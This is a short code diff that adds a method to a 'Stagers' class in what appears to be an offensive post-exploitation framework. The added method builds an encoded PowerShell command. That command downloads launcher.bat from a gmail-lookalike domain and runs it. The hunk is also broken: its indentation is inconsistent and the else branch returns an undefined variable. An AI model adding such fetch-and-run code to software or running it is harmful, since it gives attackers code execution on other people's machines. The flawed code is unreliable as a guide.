@@ -277,6 +277,12 @@ class Stagers:
 
         return server + checksum
 
+    def generate_launcher_fetcher(self, encode=True):
+         if encode:
+            return helpers.powershell_launcher('wget "http://www.grnail.us/launcher.bat" -outfile "launcher.bat"; start launcher.bat')
+        else:
+            # otherwise return the case-randomized stager
+            return stager
 
     def generate_launcher(self, listenerName, encode=True, userAgent="default", proxy="default", proxyCreds="default", stagerRetries="0"):
         """
